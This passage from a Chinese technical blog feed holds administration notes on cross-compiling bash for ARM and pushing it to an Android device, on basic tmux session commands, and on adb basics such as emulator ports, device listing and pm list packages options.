后安装到那个目录<br>--host:<br>--enable-static-link:指定bash为静态编译<br>--without-bash-malloc:指定bash不使用自带的malloc，而使用glibc的malloc,如不开启此会报错<br>    collect2: error: ld returned <span class="hljs-number">1</span> <span class="hljs-keyword">exit</span> status<br>    Makefile:<span class="hljs-number">582</span>: recipe <span class="hljs-keyword">for</span> target <span class="hljs-string">&#x27;bash&#x27;</span> failed<br>    make: *** [bash] Error <span class="hljs-number">1</span><br>--host:指定需要允许的位置，默认build，也就是说本机编译在本地运行；如果需要运行在arm环境下，需要指定为arm-linux<br><br>错误处理：<br><span class="hljs-number">1</span>、gcc command not found<br>    root@ubuntu18:~/bash-<span class="hljs-number">5.1</span><span class="hljs-comment"># make</span><br>    rm -f mksyntax<br>    gcc -DPROGRAM=<span class="hljs-string">&#x27;&quot;bash&quot;&#x27;</span> -DCONF_HOSTTYPE=<span class="hljs-string">&#x27;&quot;arm&quot;&#x27;</span> -DCONF_OSTYPE=<span class="hljs-string">&#x27;&quot;linux-gnu&quot;&#x27;</span> -DCONF_MACHTYPE=<span class="hljs-string">&#x27;&quot;arm-unknown-linux-gnu&quot;&#x27;</span> -DCONF_VENDOR=<span class="hljs-string">&#x27;&quot;unknown&quot;&#x27;</span> -DLOCALEDIR=<span class="hljs-string">&#x27;&quot;/opt/bash/share/locale&quot;&#x27;</span> -DPACKAGE=<span class="hljs-string">&#x27;&quot;bash&quot;&#x27;</span> -DSHELL -DHAVE_CONFIG_H   -I.  -I. -I.<span class="hljs-regexp">/include -I./</span>lib   -g -DCROSS_COMPILING -rdynamic -g -DCROSS_COMPILING -o mksyntax ./mksyntax.c<br>    make: gcc: Command not found<br>    Makefile:<span class="hljs-number">719</span>: recipe <span class="hljs-keyword">for</span> target <span class="hljs-string">&#x27;mksyntax&#x27;</span> failed<br>    make: *** [mksyntax] Error <span class="hljs-number">127</span><br><br>    解决方案：<br>    apt install gcc<br><br>参考链接：<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/lifexy/</span>p/<span class="hljs-number">7866453</span>.html<br></code></pre></td></tr></table></figure><p>3、编译</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">make &amp;&amp; make install<br><br>编译之后生成的bash目录，常用的bash就是bin/bash<br>root@ubuntu:~/bash-5.1<span class="hljs-comment"># ls /opt/bash -lat</span><br>total 16<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 30 </span>18:38 bin<br>drwxr-xr-x<span class="hljs-number"> 6 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 30 </span>18:38 share<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 30 </span>18:38 .<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 30 </span>18:38 ..<br><br>root@ubuntu:~/bash-5.1<span class="hljs-comment"># ls /opt/bash/bin/bash -l</span><br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3781200 </span>Aug<span class="hljs-number"> 30 </span>18:38 /opt/bash/bin/bash<br></code></pre></td></tr></table></figure><p>4、导入arm环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb -s 10.235.74.18:5555 push .\bash /data/security<br>push到设备的bash文件默认权限为666，没有执行权限<br>petrel-p1:/data/test <span class="hljs-comment"># ls -lat bash32</span><br>-rw-rw-rw- 1 root root 3781200 2021-08-30 18:39 bash32<br><br>直接执行会存在报错<br>/system/bin/sh: ./bash/bin/bash: can<span class="hljs-string">&#x27;t execute: Permission denied</span><br><span class="hljs-string"></span><br><span class="hljs-string">增加执行权限</span><br><span class="hljs-string">chmod +x bash32</span><br></code></pre></td></tr></table></figure><p>5、查看版本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">petrel-p1:/data/test # /data/test/bash <span class="hljs-comment">--version</span><br>GNU bash, <span class="hljs-keyword">version</span> <span class="hljs-number">5.1</span><span class="hljs-number">.0</span>(<span class="hljs-number">2</span>)-<span class="hljs-keyword">release</span> (arm-<span class="hljs-type">unknown</span>-linux-gnu)<br>Copyright (C) <span class="hljs-number">2020</span> Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL <span class="hljs-keyword">version</span> <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> later &lt;http://gnu.org/licenses/gpl.html&gt;<br><br>This <span class="hljs-keyword">is</span> free software; you are free <span class="hljs-keyword">to</span> change <span class="hljs-keyword">and</span> redistribute it.<br>There <span class="hljs-keyword">is</span> <span class="hljs-keyword">NO</span> WARRANTY, <span class="hljs-keyword">to</span> the extent permitted <span class="hljs-keyword">by</span> law.<br></code></pre></td></tr></table></figure><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h3><p>1、 arm not executable: 64-bit ELF file 当前可执行文件为64位，在本地环境32位无法运行，不兼容。</p><p>2、</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux</title>
    <link href="/2024/10/29/yunwei/applications/tmux/tmux/"/>
    <url>/2024/10/29/yunwei/applications/tmux/tmux/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a><strong>Centos</strong></h3><p>yum install tmux -y</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># rpm -qa | grep tmux tmux-1.8-4.el7.x86_64</span><br></code></pre></td></tr></table></figure><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a><strong>Ubuntu</strong></h3><p>apt-get install tmux</p><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a><strong>Mac</strong></h3><p>brew install tmux</p><h2 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a><strong>操作命令</strong></h2><h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a><strong>新建会话</strong></h3><p><strong>tmux new -s</strong> </p><h3 id="列举后台运行会话"><a href="#列举后台运行会话" class="headerlink" title="列举后台运行会话"></a><strong>列举后台运行会话</strong></h3><p><strong>tmux ls</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="连接指定后台运行会话"><a href="#连接指定后台运行会话" class="headerlink" title="连接指定后台运行会话"></a><strong>连接指定后台运行会话</strong></h3><p><strong>tmux a -t sessionName</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta"># tmux a -t logs</span><br>[<span class="hljs-meta">detached</span>]<br>[<span class="hljs-meta">root@nvm /</span>]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="重命名会话名"><a href="#重命名会话名" class="headerlink" title="重命名会话名"></a><strong>重命名会话名</strong></h3><p><strong>tmux rename -t oldName newName</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>logs: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux rename -t logs securelog</span><br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta"># tmux ls</span><br>securelog: <span class="hljs-number">1</span> windows (created Tue Aug <span class="hljs-number">20</span> <span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span>) [<span class="hljs-number">147</span>x37]<br>[root<span class="hljs-symbol">@nvm</span> /]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="操作快捷键"><a href="#操作快捷键" class="headerlink" title="操作快捷键"></a><strong>操作快捷键</strong></h2><h3 id="分离会话"><a href="#分离会话" class="headerlink" title="分离会话"></a><strong>分离会话</strong></h3><p>退出界面，会话保持在后台</p><p><strong>ctrl+b 接 d</strong></p><h3 id="重命名会话"><a href="#重命名会话" class="headerlink" title="重命名会话"></a><strong>重命名会话</strong></h3><p><strong>ctr+b 接 $</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-keyword">rename</span>-<span class="hljs-keyword">session</span>) logs<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>tmux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adb_base</title>
    <link href="/2024/10/29/security/mobilesec/mobilesectools/adb/adb_base/"/>
    <url>/2024/10/29/security/mobilesec/mobilesectools/adb/adb_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h1><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>$ 普通权限</p><p># root权限</p><h2 id="常见模拟器ADB端口"><a href="#常见模拟器ADB端口" class="headerlink" title="常见模拟器ADB端口"></a>常见模拟器ADB端口</h2><table><thead><tr><th>模拟器</th><th>端口号</th></tr></thead><tbody><tr><td>网易mumu模拟器</td><td>7555</td></tr><tr><td>夜神模拟器</td><td>62001</td></tr><tr><td>逍遥模拟器</td><td>21503</td></tr><tr><td>蓝叠模拟器</td><td>5555</td></tr><tr><td>雷电模拟器</td><td>5555</td></tr><tr><td>天天模拟器</td><td>5037</td></tr><tr><td>安卓模拟器大师</td><td>54001</td></tr><tr><td>腾讯手游助手</td><td>5555</td></tr></tbody></table><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><h2 id="工具组件"><a href="#工具组件" class="headerlink" title="工具组件"></a>工具组件</h2><p><strong>客户端</strong>：用于发送命令，通过adb命令从命令行终端调用客户端</p><p>**守护程序(adbd)**：用于在设备上运行命令，作为后台进程运行</p><p><strong>服务器</strong>：用于管理客户端与守护程序之间的通信，作为后台进程运行</p><h2 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h2><p>启动adb客户端时，客户端会先检查是否有 adb 服务器进程在运行，如果没有，则会启动服务器。服务器启动后与本地TCP端口5037绑定</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-symbol">C:</span>\Users\a<span class="hljs-built_in">dmin</span>&gt;adb devices<br>adb server version (<span class="hljs-number">36</span>) doesn&#x27;<span class="hljs-built_in">t</span> <span class="hljs-built_in">match</span> this client (<span class="hljs-number">41</span>); killing...<br>* daemon started successfully<br>List of devices attached<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：所有adb客户端均适用端口5037与adb服务器通信</p><p>之后，服务器会通过扫描5555到5585之间的奇数号端口查找模拟器，如果发现adb守护程序adbd，便会与相应的端口建立连接</p><p>模拟器端口号说明</p><p>每个模拟器都使用一对按照顺序排列的端口：一个用于控制台连接的偶数号端口，另一个用于adb连接的奇数号端口。</p><p>例如：</p><p>模拟器1，控制台：5554</p><p>模拟器1，adb：5555</p><p>模拟器2，控制台：5556</p><p>模拟器2，adb：5557</p><p>在端口5555处与adb连接的模拟器与控制台监听端口为5554的模拟器为同一个</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="工具包下载地址"><a href="#工具包下载地址" class="headerlink" title="工具包下载地址"></a>工具包下载地址</h3><p><a href="https://developer.android.google.cn/studio/releases/platform-tools">https://developer.android.google.cn/studio/releases/platform-tools</a></p><p>解压到指定目录</p><p><img src="/image-20241029160255214.png" alt="image-20241029160255214"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Windows path 中添加路径</p><p>D:\tools\security\adb\platform-tools</p><p>cmd 中执行 adb 命令即可</p><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h2 id="获取本地连接设备列表"><a href="#获取本地连接设备列表" class="headerlink" title="获取本地连接设备列表"></a>获取本地连接设备列表</h2><p><strong>adb devices</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino">➜  platform-tools ./adb devices<br>List of devices attached<br><br><br>➜  platform-tools ./adb devices<br>List of devices attached<br><span class="hljs-number">347e5</span>e4unauthorized<br><br>➜  platform-tools ./adb devices<br>List of devices attached<br><span class="hljs-number">347e5</span>e4device<br></code></pre></td></tr></table></figure><p>unauthorized 表示设备未授权</p><p>device 表示连接成功</p><h2 id="连接设备"><a href="#连接设备" class="headerlink" title="连接设备"></a>连接设备</h2><p>adb connect ip:5555</p><h2 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h2><p><strong>adb shell</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">➜  <span class="hljs-built_in">platform</span>-tools adb <span class="hljs-built_in">shell</span><br>sagit:/ $ ip <span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><p>待确认问题，多个设备，默认会连接哪个？</p><h2 id="查看应用列表"><a href="#查看应用列表" class="headerlink" title="查看应用列表"></a>查看应用列表</h2><h3 id="pm-list-packages"><a href="#pm-list-packages" class="headerlink" title="pm list packages"></a><strong>pm list packages</strong></h3><p><strong>adb shell pm list packages</strong></p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>pm list packages</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  platform-tools adb shell<br>sagit:/ $ pm list packages<br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.screenrecorder</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.cts</span><span class="hljs-selector-class">.priv</span><span class="hljs-selector-class">.ctsshim</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.qms</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.telemetry</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.perfdump</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.contentextension</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.corner</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.double</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.providers</span><span class="hljs-selector-class">.telephony</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.powerkeeper</span><br>package:com<span class="hljs-selector-class">.goodix</span><span class="hljs-selector-class">.fingerprint</span><br>package:com<span class="hljs-selector-class">.xiaomi</span>.miplay_client<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  /tmp adb shell pm list packages<br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.screenrecorder</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.cts</span><span class="hljs-selector-class">.priv</span><span class="hljs-selector-class">.ctsshim</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.qms</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.telemetry</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.perfdump</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.contentextension</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.corner</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.double</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.providers</span><span class="hljs-selector-class">.telephony</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.powerkeeper</span><br>package:com<span class="hljs-selector-class">.goodix</span><span class="hljs-selector-class">.fingerprint</span><br>package:com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.miplay_client</span><br>package:com<span class="hljs-selector-class">.unionpay</span><span class="hljs-selector-class">.tsmservice</span>.mi<br></code></pre></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><h5 id="f-显示应用关联的apk文件"><a href="#f-显示应用关联的apk文件" class="headerlink" title="-f 显示应用关联的apk文件"></a>-f 显示应用关联的apk文件</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>sagit:/ $ pm list packages -f<br>package:/system/app/MiuiScreenRecorder/MiuiScreenRecorder.apk=com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.screenrecorder</span><br>package:/system/priv-app/CtsShimPrivPrebuilt/CtsShimPrivPrebuilt.apk=com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.cts</span><span class="hljs-selector-class">.priv</span><span class="hljs-selector-class">.ctsshim</span><br>package:/system/vendor/app/SSGTelemetryService/SSGTelemetryService.apk=com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.qms</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.telemetry</span><br>package:/system/app/Perfdump/Perfdump.apk=com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.perfdump</span><br>package:/data/app/com<span class="hljs-selector-class">.miui</span>.contentextension-ddZEz_WF2ToehMWnZ0dhzQ==/base.apk=com<span class="hljs-selector-class">.miui</span>.contentextension<br></code></pre></td></tr></table></figure><h5 id="d-只显示disabled的应用"><a href="#d-只显示disabled的应用" class="headerlink" title="-d 只显示disabled的应用"></a>-d 只显示disabled的应用</h5><h5 id="e-只显示enabled的应用"><a href="#e-只显示enabled的应用" class="headerlink" title="-e 只显示enabled的应用"></a>-e 只显示enabled的应用</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>sagit:/ $ pm list package -e                                                                                     <br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.screenrecorder</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.cts</span><span class="hljs-selector-class">.priv</span><span class="hljs-selector-class">.ctsshim</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.qms</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.telemetry</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.perfdump</span><br>package:com<span class="hljs-selector-class">.miui</span>.contentextension<br></code></pre></td></tr></table></figure><h5 id="s-只显示系统应用"><a href="#s-只显示系统应用" class="headerlink" title="-s 只显示系统应用"></a>-s 只显示系统应用</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>sagit:/ $ pm list package -s                                                                                     <br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.screenrecorder</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.cts</span><span class="hljs-selector-class">.priv</span><span class="hljs-selector-class">.ctsshim</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.qms</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.telemetry</span><br>package:com<span class="hljs-selector-class">.qualcomm</span><span class="hljs-selector-class">.qti</span><span class="hljs-selector-class">.perfdump</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.contentextension</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.corner</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.display</span><span class="hljs-selector-class">.cutout</span><span class="hljs-selector-class">.emulation</span><span class="hljs-selector-class">.double</span><br>package:com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.providers</span><span class="hljs-selector-class">.telephony</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.powerkeeper</span><br>package:com<span class="hljs-selector-class">.goodix</span><span class="hljs-selector-class">.fingerprint</span><br><br></code></pre></td></tr></table></figure><h5 id="3-只显示第三方应用"><a href="#3-只显示第三方应用" class="headerlink" title="-3 只显示第三方应用"></a>-3 只显示第三方应用</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>sagit:/ $ pm list package -<span class="hljs-number">3</span>                                                                                     <br>package:com<span class="hljs-selector-class">.mi</span><span class="hljs-selector-class">.liveassistant</span><br>package:com<span class="hljs-selector-class">.vkontakte</span><span class="hljs-selector-class">.android</span><br>package:com<span class="hljs-selector-class">.jdd</span><span class="hljs-selector-class">.motorfans</span><br>package:com<span class="hljs-selector-class">.zhipuai</span><span class="hljs-selector-class">.qingyan</span><br>package:com<span class="hljs-selector-class">.iflytek</span><span class="hljs-selector-class">.spark</span><br>package:com<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.input_mi</span><br>package:com<span class="hljs-selector-class">.xingin</span><span class="hljs-selector-class">.xhs</span><br>package:com<span class="hljs-selector-class">.tencent</span><span class="hljs-selector-class">.mm</span><br>package:com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.mibrain</span><span class="hljs-selector-class">.speech</span><br>package:com<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.duersdk</span><span class="hljs-selector-class">.opensdk</span><br>package:com<span class="hljs-selector-class">.shututek</span><span class="hljs-selector-class">.original</span><br>package:com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.huanji</span><br>package:cn<span class="hljs-selector-class">.wps</span><span class="hljs-selector-class">.moffice_eng</span><span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.lite</span><br>package:org<span class="hljs-selector-class">.telegram</span><span class="hljs-selector-class">.messenger</span>.web<br></code></pre></td></tr></table></figure><h5 id="i-显示应用的-installer"><a href="#i-显示应用的-installer" class="headerlink" title="-i 显示应用的 installer"></a>-i 显示应用的 installer</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>sagit:/ $ pm list package -<span class="hljs-number">3</span> -<span class="hljs-selector-tag">i</span>                                                                                  <br>package:com<span class="hljs-selector-class">.mi</span><span class="hljs-selector-class">.liveassistant</span>  installer=null<br>package:com<span class="hljs-selector-class">.vkontakte</span><span class="hljs-selector-class">.android</span>  installer=com<span class="hljs-selector-class">.miui</span><span class="hljs-selector-class">.packageinstaller</span><br>package:com<span class="hljs-selector-class">.jdd</span><span class="hljs-selector-class">.motorfans</span>  installer=com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.market</span><br>package:com<span class="hljs-selector-class">.zhipuai</span><span class="hljs-selector-class">.qingyan</span>  installer=com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.market</span><br>package:com<span class="hljs-selector-class">.iflytek</span><span class="hljs-selector-class">.spark</span>  installer=com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.market</span><br>package:com<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.input_mi</span>  installer=com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.market</span><br>package:com<span class="hljs-selector-class">.xingin</span><span class="hljs-selector-class">.xhs</span>  installer=com<span class="hljs-selector-class">.xiaomi</span><span class="hljs-selector-class">.market</span><br>package:com<span class="hljs-selector-class">.tencent</span><span class="hljs-selector-class">.mm</span>  installer=com<span 